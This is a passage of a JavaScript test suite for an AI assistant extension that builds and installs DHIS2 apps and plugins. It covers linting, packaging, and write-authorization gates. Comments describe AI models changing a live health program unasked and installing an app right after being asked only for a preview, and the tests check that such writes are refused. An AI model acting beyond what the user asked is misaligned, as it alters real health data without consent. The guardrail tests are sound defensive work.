      truthy('…and the line list\'s own query sends the range as enrollmentDate=<start>_<end>, not as a period',
        /enrollmentDate=1900-01-01_2026-09-15/.test(probe.path) && !/pe:1900/.test(probe.path) && probe.hasTime);
    }
    {
      // Low-birth-weight share 3 / 11,025 = 0.027 % came back "0.0" at one decimal, and the
      // data check said the tile showed 0 "because nothing matches" (2026-11-25).
      const savedSdf = ctx.safeDhis2Fetch;
      let asked = '';
      ctx.safeDhis2Fetch = async (p) => { asked = p; return { headers: [{ name: 'dx' }, { name: 'pe' }, { name: 'value' }], rows: [['piShare0001', '2026', /skipRounding=true/.test(p) ? '0.0272' : '0.0'], ['piZero00001', '2026', '0']] }; };
      try {
        const t = await ctx.dataCheckAggregateTile({ tile: 'LBW share', type: 'SINGLE_VALUE' }, { dataDimensionItems: [{ programIndicator: { id: 'piShare0001', displayName: 'LBW %' } }, { programIndicator: { id: 'piZero00001', displayName: 'Zero %' } }], organisationUnits: [{ id: 'ouRoot00001' }], periods: [{ id: '2026' }] });
        truthy('the data check reads unrounded values and counts any returned row (also a real 0) as data; a value below the displayed decimals is named',
          /skipRounding=true/.test(asked) && t.state === 'ok' && (t.rounds_to_zero || []).length === 1 && t.rounds_to_zero[0].name === 'LBW %');
      } finally { ctx.safeDhis2Fetch = savedSdf; }
    }
    truthy('…and so is a child keyed by the values (props, not its own state)', !once("function List({ page, q }) { const { data } = useDataQuery(Q, { variables: { page, q } }); return null; }\nfunction A() { const [q, setQ] = useState(''); const [page, setPage] = useState(1); return <List key={q + page} page={page} q={q} />; }"));
  }
  {
    // dataStore key reads: a 404 until the key exists (live 2026-10-22).
    const ds = (src) => lint(src + root).errors.some((e) => /is read directly, which is a 404/.test(e.message));
    truthy('reading dataStore/<ns>/<key> directly is an error (404 until the first save)', ds("const { useDataEngine, DataProvider } = D2Runtime;\nconst KEY = `dataStore/${D2_APP_CONFIG.namespace}/notes`;\nconst A = () => { const engine = useDataEngine(); engine.query({ n: { resource: KEY } }); return null; };"));
    truthy('…a key path inside a mutation (type: create) is fine', !ds("const { useDataEngine, DataProvider } = D2Runtime;\nconst A = ({ id }) => { const engine = useDataEngine(); engine.mutate({ resource: `dataStore/${D2_APP_CONFIG.namespace}/${id}`, type: 'create', data: { a: 1 } }); return null; };"));
    truthy('…and the filter=_:eq: read keeps the whole app clean', !ds("const { useDataEngine, DataProvider } = D2Runtime;\nconst S = { s: { resource: `dataStore/${D2_APP_CONFIG.namespace}`, params: { fields: '.', filter: '_:eq:notes' } } };\nconst KEY = `dataStore/${D2_APP_CONFIG.namespace}/notes`;\nconst A = () => null;"));
  }
  {
    // An always-open Modal blocks the whole app (live 2026-10-22).
    const modal = (body) => lint("const { Modal, ModalTitle } = D2UI;\nconst A = ({ t, open }) => " + body + ";" + root).errors.some((e) => /rendered unconditionally/.test(e.message));
    truthy('an unconditional <Modal> child is an error (its backdrop blocks every click)', modal('<div><p>x</p><Modal><ModalTitle>Delete</ModalTitle></Modal></div>'));
    truthy('…{t && <Modal>}, a ternary, hide={!open} and a component returning a Modal are fine',
      !modal('<div>{t && <Modal><ModalTitle>D</ModalTitle></Modal>}</div>') && !modal('<div>{t ? <Modal><ModalTitle>D</ModalTitle></Modal> : null}</div>')
      && !modal('<div><Modal hide={!open}><ModalTitle>D</ModalTitle></Modal></div>') && !modal('<Modal><ModalTitle>D</ModalTitle></Modal>'));
  }
  {
    // Mutation shapes app-runtime refuses at runtime (live 2026-10-22).
    const mu = (body) => lint("const { useDataEngine, DataProvider } = D2Runtime;\nconst A = ({ rest, last, k }) => { const engine = useDataEngine(); " + body + " return null; };" + root).errors.map((e) => e.message).join(' | ');
    truthy("{ type: last ? 'delete' : 'update', data } is an error (Invalid query at runtime)", /does not support property 'data'/.test(mu("engine.mutate({ resource: `dataStore/x/${k}`, type: last ? 'delete' : 'update', data: rest });")));
    truthy("{ type: 'create', id } is an error", /does not support property 'id'/.test(mu("engine.mutate({ resource: 'dataStore/x', type: 'create', id: k, data: rest });")));
    truthy("{ type: 'delete' } without data and { type: 'update', data } are fine", !/does not support/.test(mu("engine.mutate({ resource: `dataStore/x/${k}`, type: 'delete' }); engine.mutate({ resource: `dataStore/x/${k}`, type: 'update', data: rest });")));
    truthy("a non-mutation object with type 'delete' (no resource) is not flagged", !/does not support/.test(mu("const action = { type: 'delete', data: rest };")));
  }
  {
    // dhis2_query: ;-joined metadata filters are a 400 (live 2026-10-22).
    const h = ctx.healJoinedMetadataFilters;
    const split = new URLSearchParams(h('programs?fields=id&filter=programType:eq:WITH_REGISTRATION;displayName:ilike:mch').split('?')[1]).getAll('filter');
    truthy('joined metadata filters are split into one filter parameter each', JSON.stringify(split) === JSON.stringify(['programType:eq:WITH_REGISTRATION', 'displayName:ilike:mch']));
    truthy('…analytics ou:A;B filters stay joined', h('analytics?dimension=pe:THIS_YEAR&filter=ou:USER_ORGUNIT;USER_ORGUNIT_CHILDREN') === 'analytics?dimension=pe:THIS_YEAR&filter=ou:USER_ORGUNIT;USER_ORGUNIT_CHILDREN');
    truthy('…a single filter or a value with ; that is not an expression is untouched', h('programs?filter=displayName:eq:a') === 'programs?filter=displayName:eq:a' && h('dataElements?filter=name:like:a;b') === 'dataElements?filter=name:like:a;b');
  }
  truthy('a plugin without the getPropsFromParent handshake is an error', ctx.lintCustomAppCode({ 'plugin.jsx': ctx.compileCustomAppFile('plugin.jsx', 'const A = () => null;' + root).code }, 'plugin', kitMeta).errors.some((e) => /getPropsFromParent/.test(e.message)));
  {
    // Capture enrollment plugins (props verified against the plugins installed on 2.42 / Capture 106).
    const capLint = (src) => ctx.lintCustomAppCode({ 'plugin.jsx': ctx.compileCustomAppFile('plugin.jsx', src + root).code }, 'plugin', kitMeta, 'CAPTURE').warnings.map((w) => w.message).join(' | ');
    const shake = "\npostRobot.send(window.parent, 'getPropsFromParent');";
    truthy('CAPTURE: missing setPluginHeight warns that Capture sizes the widget to the reported height', /Capture sizes the widget/.test(capLint('const A = ({ enrollmentId }) => enrollmentId;' + shake)));
    truthy('CAPTURE: a plugin that reads neither enrollmentId/teiId nor values/setFieldValue is warned', /neither enrollmentId \/ teiId/.test(capLint('const A = ({ enrollment }) => enrollment;' + shake)));
    truthy('CAPTURE: reading enrollmentId clears that warning', !/neither enrollmentId/.test(capLint('const A = ({ enrollmentId, setPluginHeight }) => enrollmentId;' + shake)));
    truthy('CAPTURE: a form-field plugin (values / setFieldValue) is not told to read enrollmentId', !/neither enrollmentId/.test(capLint("const A = ({ values, setFieldValue }) => { setFieldValue({ fieldId: 'x', value: values.y }); return null; };" + shake)));
    truthy('CAPTURE: reporting a wrapper offsetHeight (not #root) is warned', /Report the height of #root/.test(capLint('const A = ({ enrollmentId, setPluginHeight }) => { const ref = React.useRef(null); setPluginHeight(ref.current.offsetHeight); return enrollmentId; };' + shake)));
    truthy('DASHBOARD wording unchanged for dashboard plugins', /dashboard item keeps its default height/.test(ctx.lintCustomAppCode({ 'plugin.jsx': ctx.compileCustomAppFile('plugin.jsx', 'const A = () => null;' + shake + root).code }, 'plugin', kitMeta, 'DASHBOARD').warnings.map((w) => w.message).join(' ')));
    const where = ctx.customAppWhereToFind({ name: 'Meds', key: 'ai-meds', plugin_launch_url: 'http://x/api/apps/ai-meds/plugin.html' }, 'plugin', 'CAPTURE').join(' ');
    truthy('CAPTURE where_to_find says it is not placed yet and how to place it (place action / Configurator)', /Not placed yet/.test(where) && /action="place"/.test(where) && /Tracker Plugin Configurator/.test(where));
    truthy('the manual documents the verified Capture props', /teiId, programId, enrollmentId, orgUnitId/.test(ctx.MANUAL_EXTRAS.manage_custom_app || ''));
    truthy('a cut-off manage_custom_app call gets code-shrinking advice, not program-splitting advice', /Write SHORTER source/.test(ctx.smallerCallHint('manage_custom_app')) && !/create_program/.test(ctx.smallerCallHint('manage_custom_app')));
    truthy('…and any other tool gets the split-into-smaller-calls advice', /add_stage/.test(ctx.smallerCallHint('create_metadata')));
    truthy('…the corrupted-arguments path uses that advice', /smallerCallHint\(toolName\)/.test(vm.runInContext('_runAgenticLoopInner.toString()', ctx)));
  }
  const clean = "const { useState } = React;\nconst { DataProvider, useDataQuery } = D2Runtime;\nconst { Card, CircularLoader } = D2UI;\nconst Q = { me: { resource: 'me' } };\nfunction Box({ icon: Icon }) { return <Icon />; }\nfunction A() { const [n] = useState(0); const { loading } = useDataQuery(Q); return loading ? <CircularLoader /> : <Card>{n}</Card>; }\nReactDOMClient.createRoot(document.getElementById('root')).render(<DataProvider baseUrl={D2_APP_CONFIG.baseUrl} apiVersion={D2_APP_CONFIG.apiVersion}><A /></DataProvider>);";
  eq('a clean read-only app lints with no errors', lint(clean).errors, []);
  // DHIS2 app-development skill conventions → advisory warnings.
  const warns = (src) => lint(src + root).warnings.map((w) => w.message).join(' | ');
  truthy('warning: metadata query without fields', /without a fields parameter/.test(warns("const Q = { p: { resource: 'programs', params: { paging: false } } };\nconst A = () => null;")));
  truthy('warning: fields with name instead of displayName', /displayName/.test(warns("const Q = { p: { resource: 'programs', params: { fields: 'id,name' } } };\nconst A = () => null;")));
  truthy('warning: delete without a confirmation Modal', /confirmation/.test(warns("const M = { resource: 'dataStore/x/y', type: 'delete' };\nconst A = () => null;")));
  eq('no warnings for fields id,displayName', warns("const Q = { p: { resource: 'programs', params: { fields: 'id,displayName' } } };\nconst A = () => null;"), '');
  eq('a clean read-only app passes the safety scan', scan(clean).length, 0);
  const uids = ctx.extractCustomAppUids({ 'app.jsx': 'const a = "fbfJHSPpUQD"; const b = "dataElement"; const c = "ProgramName"; const d = "dx:IpHINAT79UW;Eoof9sGAqcT";' });
  eq('UID extraction: real-looking ids only, not camelCase words', uids.sort(), ['Eoof9sGAqcT', 'IpHINAT79UW', 'fbfJHSPpUQD']);

  // Stubbed transport: the kit comes from disk; /api/apps answers from APPS.
  let APPS = [];
  let calls = [];
  ctx.fetch = (url) => {
    const u = String(url);
    calls.push(u);
    if (u.startsWith('chrome-extension://verify/')) {
      const abs = path.join(ROOT, u.slice('chrome-extension://verify/'.length));
      const buf = fs.existsSync(abs) ? fs.readFileSync(abs) : null;
      return Promise.resolve({ ok: !!buf, status: buf ? 200 : 404, text: async () => buf.toString('utf8'), arrayBuffer: async () => buf.buffer.slice(buf.byteOffset, buf.byteOffset + buf.length) });
    }
    return Promise.reject(new Error('network disabled in verify: ' + u));
  };
  ctx.safeDhis2Fetch = async (p, o) => {
    calls.push(`${(o && o.method) || 'GET'} ${p}`);
    if (p === 'apps') return APPS;
    if (/^metadata\?fields=id&filter=id:in:/.test(p)) return { programs: [{ id: 'fbfJHSPpUQD' }] };
    if (p === 'system/info?fields=version') return { version: '2.42.5.1' };
    return { _error: 'unexpected call in verify: ' + p };
  };

  // Packaging per kind: expected files, manifest fields, echarts only when used.
  const unzip = (z) => ctx.fflate.unzipSync(z);
  const td = new TextDecoder();
  const mkSpec = (kind, sources, extra) => Object.assign(ctx.customAppSpecFromArgs({ name: 'Verify app', kind, plugin_type: kind === 'app' ? undefined : 'DASHBOARD' }, 'ai-verify-app', null), { sources }, extra || {});
  const appSrc = clean;
  const pluginSrc = "const { DataProvider } = D2Runtime;\nconst P = () => <div>p</div>;\nconst root = ReactDOMClient.createRoot(document.getElementById('root'));\npostRobot.send(window.parent, 'getPropsFromParent').then(({ data }) => root.render(<DataProvider baseUrl={D2_APP_CONFIG.baseUrl} apiVersion={D2_APP_CONFIG.apiVersion}><P {...data} /></DataProvider>));";
  const kinds = {
    app: { 'app.jsx': appSrc },
    plugin: { 'plugin.jsx': pluginSrc },
    app_and_plugin: { 'app.jsx': appSrc, 'plugin.jsx': pluginSrc, 'shared.jsx': 'const SHARED = 1;' },
  };
  for (const [kind, sources] of Object.entries(kinds)) {
    const prep = await ctx.prepareCustomAppBuild(mkSpec(kind, { ...sources }));
    if (prep._error) { bad(`package ${kind}: ${prep._error} ${JSON.stringify(prep.problems || prep.violations || '')}`); continue; }
    const files = unzip(prep.pkg.zip);
    const m = JSON.parse(td.decode(files['manifest.webapp']));
    const ai = JSON.parse(td.decode(files['src/manifest.ai.json']));
    const need = ['manifest.webapp', 'app-config.js', 'd2-kit.min.js', 'd2-kit.css', 'fonts/roboto-latin-400-normal.woff2', 'src/manifest.ai.json']
      .concat(kind !== 'plugin' ? ['index.html', 'app.js', 'src/app.jsx'] : [])
      .concat(kind !== 'app' ? ['plugin.html', 'plugin.js', 'src/plugin.jsx'] : [])
      .concat(kind === 'app_and_plugin' ? ['shared.js', 'src/shared.jsx'] : []);
    const missing = need.filter((f) => !files[f]);
    truthy(`${kind}: zip has ${need.length} expected files`, missing.length === 0 || missing);
    truthy(`${kind}: manifest short_name/developer/namespace`, m.short_name === 'ai-verify-app' && m.developer && m.developer.company === 'dhis2-ai-assistant' && m.activities.dhis.namespace === 'ai-verify-app');
    truthy(`${kind}: launch_path ${kind === 'plugin' ? 'omitted' : 'set'}, plugin fields ${kind === 'app' ? 'omitted' : 'set'}`,
      (kind === 'plugin' ? !m.launch_path : m.launch_path === 'index.html') && (kind === 'app' ? !m.plugin_launch_path && !m.plugin_type : m.plugin_launch_path === 'plugin.html' && m.plugin_type === 'DASHBOARD'));
    truthy(`${kind}: AI manifest marker + file list`, ai.created_by === 'dhis2-ai-assistant' && ai.key === 'ai-verify-app' && ai.files.length === Object.keys(sources).length && ai.kit_version === kitMeta.kit_version);
    truthy(`${kind}: no echarts.min.js when the code does not use it`, !files['echarts.min.js']);
    truthy(`${kind}: D2_APP_CONFIG carries serverVersion {major:2,minor:42} and apiVersion 42`, /"serverVersion":\{"major":2,"minor":42,"patch":5,"full":"2\.42\.5\.1"\}/.test(td.decode(files['app-config.js'])) && /"apiVersion":42/.test(td.decode(files['app-config.js'])));
    if (kind === 'app_and_plugin') {
      const html = td.decode(files['plugin.html']);
      truthy('plugin.html loads kit → config → shared → plugin in order, body.d2-plugin, dir=auto',
        /d2-kit\.min\.js[\s\S]*app-config\.js[\s\S]*shared\.js[\s\S]*plugin\.js/.test(html) && /<body class="d2-plugin">/.test(html) && /<html dir="auto">/.test(html));
      const capHtml = ctx.buildCustomAppHtml({ name: 'x', pluginType: 'CAPTURE', usesEcharts: false, sources: { 'plugin.jsx': '' } }, 'plugin.js');
      truthy('a CAPTURE plugin page is auto-height (no body.d2-plugin) and links capture-plugin.css (#root flow-root)', /<body class="d2-capture-plugin">/.test(capHtml) && !/d2-plugin"/.test(capHtml) && /href="capture-plugin\.css"/.test(capHtml) && /flow-root/.test(ctx.CAPTURE_PLUGIN_CSS || vm.runInContext('CAPTURE_PLUGIN_CSS', ctx)));
    }
  }
  const chartSrc = appSrc.replace('function A() {', 'function C() { const el = React.useRef(null); React.useEffect(() => { echarts.init(el.current); }, []); return <div ref={el} />; }\nfunction A() {');
  const pc = await ctx.prepareCustomAppBuild(mkSpec('app', { 'app.jsx': chartSrc }));
  truthy('echarts.min.js is bundled (and loaded before app.js) when the code uses echarts',
    !pc._error && unzip(pc.pkg.zip)['echarts.min.js'] && /echarts\.min\.js[\s\S]*app\.js/.test(td.decode(unzip(pc.pkg.zip)['index.html'])));
  const unk = await ctx.prepareCustomAppBuild(mkSpec('app', { 'app.jsx': clean.replace("resource: 'me'", "resource: 'programs/AbCdEfGh123'") }));
  truthy('a hard-coded UID that does not exist on the server is refused', unk.unknown_uids && unk.unknown_uids[0] === 'AbCdEfGh123');
  {
    const savedSdf = ctx.safeDhis2Fetch;
    ctx.safeDhis2Fetch = async (p, o) => (/^metadata\?fields=id&filter=id:in:/.test(p) ? { programIndicators: [{ id: 'YTg1u5yjZKQ' }], programs: [{ id: 'fbfJHSPpUQD' }] } : savedSdf(p, o));
    try {
      const evAgg = clean.replace("resource: 'me'", "resource: 'analytics/events/aggregate/fbfJHSPpUQD', params: { dimension: ['ou:USER_ORGUNIT', 'YTg1u5yjZKQ'], eventStatus: 'ACTIVE,COMPLETED' }");
      const piBad = await ctx.prepareCustomAppBuild(mkSpec('app', { 'app.jsx': evAgg }));
      truthy('program indicators read through analytics/events/aggregate are refused at preview (409 E7224 in the browser)', /refuses program indicators there/.test(piBad._error || ''));
      const piOk = await ctx.prepareCustomAppBuild(mkSpec('app', { 'app.jsx': clean.replace("resource: 'me'", "resource: 'analytics', params: { dimension: ['dx:YTg1u5yjZKQ', 'ou:USER_ORGUNIT'] }") }));
      truthy('…the plain analytics resource with dx: passes', !/refuses program indicators/.test(piOk._error || ''));
    } finally { ctx.safeDhis2Fetch = savedSdf; }
  }

  // Never touch apps the assistant did not build.
  calls = [];
  const notAi = await ctx.executeManageCustomApp({ action: 'delete', key: 'dashboard' });
  truthy('delete "dashboard" (no ai- prefix) refused before any request', notAi._refused_not_managed && calls.length === 0);
  APPS = [{ key: 'ai-demo', name: 'AI Demo', version: '1.0.0', folderName: 'apps/ai-demo' }];
  d.writeAuth = { scope: 'broad', reason: 'verify' };
  const noMarker = await ctx.executeManageCustomApp({ action: 'update', key: 'ai-demo', files: { 'app.jsx': appSrc } });
  truthy('update of an ai- app WITHOUT the assistant marker is refused', noMarker._refused_not_managed);
  truthy('…without fetching its files (no probe that would 404)', !calls.some((c) => /\/api\/apps\/ai-demo\//.test(c)));
  truthy('delete of an ai- app without the marker is refused', (await ctx.executeManageCustomApp({ action: 'delete', key: 'ai-demo' }))._refused_not_managed);
  truthy('rollback of an ai- app without the marker is refused', (await ctx.executeManageCustomApp({ action: 'rollback', key: 'ai-demo' }))._refused_not_managed);

  // Conflicts are caught client-side (no 409 round trip).
  APPS = [{ key: 'ai-other', folderName: 'apps/ai-verify-app', activities: { dhis: { namespace: 'ai-verify-app' } } }];
  const conf = ctx.customAppConflicts(mkSpec('app', {}), APPS, 'create').map((c) => c.code).sort();
  eq('namespace + upload-folder collisions detected before upload', conf, ['folder_in_use', 'namespace_in_use']);

  // requireWriteAuth gates every write action.
  APPS = [{ key: 'ai-verify-app', name: 'Verify app', version: '1.0.0', folderName: 'apps/ai-verify-app', developer: { company: 'dhis2-ai-assistant' } }];
  d.writeAuth = { scope: 'read_only', reason: 'verify: no authorization' };
  const gated = (r) => r && r._scope === 'requires_user_confirmation' && /manage_custom_app/.test(r._error);
  truthy('create is refused on a read-only turn', gated(await ctx.executeManageCustomApp({ action: 'create', key: 'ai-verify-new', name: 'New', files: { 'app.jsx': appSrc } })));
  {
    // NCD worklist app (deepseek, 2026-11-08): an app request added a stage and a data
    // element to the live program to hold its notes, without asking.
    const savedWa = d.writeAuth, savedTurn = d.turnCounter, savedRef = d.lastRefusedWrite, savedMine = d.assistantCreatedIds;
    const ask = (text, opts = {}) => {
      vm.runInContext(`lastUserText = ${JSON.stringify(text)};`, ctx);
      d.writeAuth = { scope: 'broad', reason: 'verify', verbs: { create: true, update: true } };
      return ctx.requireWriteAuth('create_metadata', opts.action || 'add_stage', { program_id: opts.program || 'progLive001' });
    };
    try {
      d.turnCounter = 10; d.lastRefusedWrite = null; d.assistantCreatedIds = ['progMine001'];
      const appAsk = 'Build and install an app called "NCD follow-up worklist" with a "Mark as called" button that saves a short note on the server.';
      const r = ask(appAsk);
      truthy('an app request does not let create_metadata add a stage to an existing program: refused, asking the user, nothing saved',
        r && r._scope === 'program_change_not_requested' && /tracker data, not the dataStore/.test(r._hint) && /Ask/.test(r._hint));
      truthy('…nor add data elements to a stage or add program rules', ask(appAsk, { action: 'add_data_elements_to_stage' })?._scope === 'program_change_not_requested' && ask(appAsk, { action: 'add_program_rules' })?._scope === 'program_change_not_requested');
      truthy('…while a program request still adds stages', ask('Add a repeatable follow-up call stage to the NCD program') === null && ask('Create a tracker program for TB follow-up') === null);
      truthy('…an app request that names the change is allowed ("add a stage for the call notes")', ask('Build an app that logs calls, and add a new stage to the NCD program for the call notes.') === null);
      truthy('…a program built in this conversation is the assistant\'s own work', ask(appAsk, { program: 'progMine001' }) === null);
      ask(appAsk);
      d.turnCounter = 11;
      vm.runInContext(`conversationHistory = [{ role: 'user', content: ${JSON.stringify(appAsk)} }];`, ctx);
      truthy('…and the user agreeing next turn ("yes, go ahead") lets the proposed change through', ask('Yes, go ahead.') === null);
    } finally {
      d.writeAuth = savedWa; d.turnCounter = savedTurn; d.lastRefusedWrite = savedRef; d.assistantCreatedIds = savedMine;
      vm.runInContext('lastUserText = ""; conversationHistory = [];', ctx);
    }
  }
  truthy('delete is refused on a read-only turn', gated(await ctx.executeManageCustomApp({ action: 'delete', key: 'ai-verify-app' })));
  const aiManifest = { key: 'ai-verify-app', name: 'Verify app', kind: 'app', version: '1.0.0', created_by: 'dhis2-ai-assistant', files: ['app.jsx'] };
  ctx.fetch = ((inner) => (url, o) => {
    const u = String(url);
    if (u.endsWith('/api/apps/ai-verify-app/src/manifest.ai.json')) return Promise.resolve({ ok: true, status: 200, type: 'basic', text: async () => JSON.stringify(aiManifest) });
    if (u.endsWith('/api/apps/ai-verify-app/src/app.jsx')) return Promise.resolve({ ok: true, status: 200, type: 'basic', text: async () => appSrc });
    return inner(url, o);
  })(ctx.fetch);
  truthy('update is refused on a read-only turn', gated(await ctx.executeManageCustomApp({ action: 'update', key: 'ai-verify-app', files: { 'app.jsx': appSrc } })));
  const pv = await ctx.executeManageCustomApp({ action: 'preview', name: 'Verify app 2', files: { 'app.jsx': appSrc } });
  truthy('preview runs on a read-only turn (discovery) and returns a token', pv.preview === true && /^pv-[0-9a-f]{16}$/.test(pv.preview_token || ''));
  {
    // Approval = the user's next message, unless they already asked to install
    // (GLM installed right after "Show me a preview first", live 2026-10-22).
    const asked = ctx.userAskedToInstall;
    for (const t of ['Please create and install and enrollment plugin here', 'yes install it', 'build it and deploy it to the server'])
      truthy(`install intent: "${t}"`, asked(t));
    for (const t of ['Build a dashboard widget that shows enrollments. Show me a preview first.', 'make a widget but don\'t install it yet', 'create a KPI plugin', 'preview the app first, then install'])
      truthy(`no install intent: "${t}"`, !asked(t));
    const turn = d.turnCounter || 0;
    vm.runInContext('lastUserText = "Build a dashboard widget. Show me a preview first.";', ctx);
    const same = ctx.customAppApprovalProblem('ai-x', 'pv-0123456789abcdef', turn);
    truthy('create with a preview from THIS turn is refused while the user has not approved', same && same._awaiting_approval === true && /preview_token="pv-0123456789abcdef"/.test(same._hint));
    truthy('…and allowed once the turn has advanced (the user answered)', ctx.customAppApprovalProblem('ai-x', 'pv-0123456789abcdef', turn - 1) === null);
    vm.runInContext('lastUserText = "Please create and install a medication widget";', ctx);
    truthy('…and allowed in the same turn when the user asked to install', ctx.customAppApprovalProblem('ai-x', 'pv-0123456789abcdef', turn) === null);
    vm.runInContext('lastUserText = "";', ctx);
    vm.runInContext('lastUserText = "build me a widget";', ctx);
    truthy('a file create with no earlier preview and no install request is refused', /has not seen a preview/.test((ctx.customAppApprovalProblem('ai-x', null, null) || {})._error || ''));
    truthy('…allowed when the user asked to put it somewhere (placing implies installing)', (vm.runInContext('lastUserText = "create a chart plugin and add it to a new dashboard called Ops";', ctx), ctx.customAppApprovalProblem('ai-x', null, null)) === null);
    truthy('…and allowed after a preview shown in an earlier turn', (vm.runInContext('lastUserText = "ok";', ctx), ctx.customAppApprovalProblem('ai-x', null, turn - 1)) === null);
    vm.runInContext('lastUserText = "";', ctx);
    const pvTurn = await ctx.recallCustomAppPreview(pv.preview_token);
    truthy('the preview remembers the turn it was made in', pvTurn && pvTurn.spec && pvTurn.turn === turn);
    // deepseek sent create with the token alone and was told to pass a name or key.
    const byToken = await ctx.executeManageCustomApp({ action: 'create', preview_token: pv.preview_token });
    truthy('create with only a preview_token takes the app from the preview (reaches the write gate as ai-verify-app-2, not "Pass name or key")',
      gated(byToken) && /ai-verify-app-2/.test(JSON.stringify(byToken)) && !/Pass "name"/.test(byToken._error || ''));
    truthy('…and an unknown token alone says it has expired', /has expired/.test((await ctx.executeManageCustomApp({ action: 'create', preview_token: 'pv-ffffffffffffffff' }))._error || ''));
  }
  truthy('preview / list / get_source are discovery actions; create is not',
    ctx.isDiscoveryCall('manage_custom_app', { action: 'preview' }) && ctx.isDiscoveryCall('manage_custom_app', { action: 'list' }) && !ctx.isDiscoveryCall('manage_custom_app', { action: 'create' }));

  // Raw dhis2_query can no longer install / uninstall apps.
  d.writeAuth = { scope: 'broad', reason: 'verify' };
  const rawDel = await ctx.executeTool('dhis2_query', { method: 'DELETE', path: 'apps/dashboard' });
  truthy('dhis2_query DELETE apps/<key> is blocked → manage_custom_app', rawDel && rawDel._redirect === 'manage_custom_app');
  // The Capture-layout block is unconditional, so its hint must not invite a
  // "confirm and I'll write it" offer (seen live 2026-10-22 with GLM).
  const capPut = await ctx.executeTool('dhis2_query', { method: 'PUT', path: 'dataStore/capture/enrollmentOverviewLayout', body: {} });
  truthy('dhis2_query PUT dataStore/capture is blocked with an unconditional hint that points to the Tracker Plugin Configurator',
    capPut && /^Blocked/.test(capPut._error || '') && /no user confirmation lifts it/.test(capPut._hint || '') && /manage_custom_app\(action="place"\)/.test(capPut._hint || '') && /Tracker Plugin Configurator/.test(capPut._hint || '') && !/confirm the exact JSON/.test(capPut._hint || ''));

  // A write answered 204 is never re-sent: the empty-body retry turned a
  // completed DELETE /api/apps/<key> into "404 App does not exist".
  let n204 = 0;
  ctx.fetch = () => {
    n204++;
    return Promise.resolve(n204 === 1
      ? { ok: true, status: 204, statusText: 'No Content', type: 'basic', text: async () => '' }
      : { ok: false, status: 404, statusText: 'Not Found', type: 'basic', text: async () => '{"message":"App does not exist: ai-verify-app"}' });
  };
  const del204 = await ctx.__realSafeDhis2Fetch('apps/ai-verify-app', { method: 'DELETE' });
  truthy('a DELETE answered 204 is a success and is NOT re-sent', del204 && del204.success === true && n204 === 1);

  // fetchViaTab: executeScript args must be cloneable — a body-less write
  // (every DELETE) passed `undefined` and Chrome rejected the injection.
  const savedTabs = chrome.tabs.query, savedScripting = chrome.scripting.executeScript;
  let injectedArgs = null;
  chrome.tabs.query = () => Promise.resolve([{ id: 7, url: 'http://localhost:8081/apps/dashboard' }]);
  chrome.scripting.executeScript = (inj) => { injectedArgs = inj.args; return Promise.resolve([{ result: { ok: true, status: 204, statusText: 'No Content', text: '' } }]); };
  const viaTab = await ctx.fetchViaTab('http://localhost:8081/api/42/apps/ai-verify-app', 'DELETE', {}, undefined);
  truthy('fetchViaTab sends null (not undefined) as the body of a body-less write', injectedArgs && injectedArgs.length === 4 && injectedArgs[3] === null && viaTab && viaTab.status === 204);
  chrome.tabs.query = savedTabs;
  chrome.scripting.executeScript = savedScripting;

  // A 409 from a direct DELETE (ObjectReport) keeps its reasons.
  ctx.fetch = () => Promise.resolve({ ok: false, status: 409, statusText: 'Conflict', type: 'basic', text: async () => JSON.stringify({ httpStatus: 'Conflict', httpStatusCode: 409, status: 'ERROR', message: 'Could not delete', response: { responseType: 'ObjectReport', errorReports: [{ message: 'Object could not be deleted because it is associated with another object: Event', errorCode: 'E4030' }] } }) });
  const del409 = await ctx.__realSafeDhis2Fetch('dataElements/a3kGcGpz8FJ', { method: 'DELETE' });
  truthy('DELETE 409 (ObjectReport) surfaces errorReports + the soft-deleted-event hint', (del409.error_details || []).some((m) => /associated with another object: Event/.test(m)) && /softDeletedEventRemoval/.test(del409._hint || ''));

  // Chrome answers a write from the extension origin with an empty 200 and
  // DHIS2 installs nothing: uploadAppZip must not call that a success.
  ctx.fetch = () => Promise.resolve({ ok: true, status: 200, type: 'basic', text: async () => '' });
  const emptyUp = await ctx.uploadAppZip(new Uint8Array([1, 2, 3]), 'ai-verify-app.zip');
  truthy('an empty 2xx upload response is "NOT installed" with an open-a-DHIS2-tab hint', /NOT installed/.test(emptyUp._error || '') && /DHIS2 tab/.test(emptyUp._hint || ''));

  // Registry wiring + intent routing.
  truthy('manage_custom_app is routed, write-capable, manual-gated, summarised, with a manual',
    ctx.__TOOL_ROUTER.manage_custom_app === true && ctx.WRITE_CAPABLE_TOOL_NAMES.has('manage_custom_app') && ctx.MANUAL_TOOLS.has('manage_custom_app')
    && typeof ctx.TOOL_SUMMARIES.manage_custom_app === 'string' && /getPropsFromParent/.test(ctx.MANUAL_EXTRAS.manage_custom_app || ''));
  const intent = ctx.detectCustomAppIntent;
  for (const t of ['Build a dashboard widget that shows ANC coverage by district', 'make an app that lists programs with their stage counts', 'create a plugin for the dashboard', 'update ai-kpi-plugin to show 4 cards', 'roll back my custom app'])
    truthy(`intent: "${t}" → manage_custom_app`, intent(t.toLowerCase()));
  for (const t of ['in the capture app create a program for tb', 'install the growth chart plugin', 'create a program indicator for anc visits', 'open the dashboard app'])
    truthy(`no intent: "${t}"`, !intent(t.toLowerCase()));
  const names = (txt) => ctx.getContextualTools({ appType: 'Dashboard' }, txt).map((x) => x.function.name);
  truthy('getContextualTools offers manage_custom_app for a widget request', names('Build a dashboard widget that shows ANC coverage').includes('manage_custom_app'));
  truthy('…and not for an ordinary indicator request', !names('create a program indicator for anc visits').includes('manage_custom_app'));

  d.baseUrl = saved.baseUrl; d.apiVersion = saved.apiVersion; d.writeAuth = saved.writeAuth;
  ctx.fetch = saved.fetch; ctx.safeDhis2Fetch = saved.sdf;
}

// ── Chat history must survive an over-quota state (live 2026-10-22) ─────────
// On a big program's Capture page programMetadata was 6.1 MB; saveState wrote
// it in the SAME set() as chatHistory, Chrome rejected the whole write
// ("Session storage quota bytes exceeded"), the catch swallowed it, and after
// the idle worker was evicted the next message ("yes install it") ran with no
// history at all.
async function runStatePersistenceChecks() {
  console.log('\nState persistence (session quota):');
  const truthy = (label, got) => (got ? ok(label) : bad(`${label} => ${JSON.stringify(got)}`));
  const d = ctx.__dhis2();
  const realSession = chrome.storage.session;
  const saved = {};
  const QUOTA = 1_000_000; // stand-in for Chrome's 10 MB: any single value over it is rejected
  chrome.storage.session = {
    get: () => Promise.resolve({}),
    remove: () => Promise.resolve(),
    set: (obj) => {
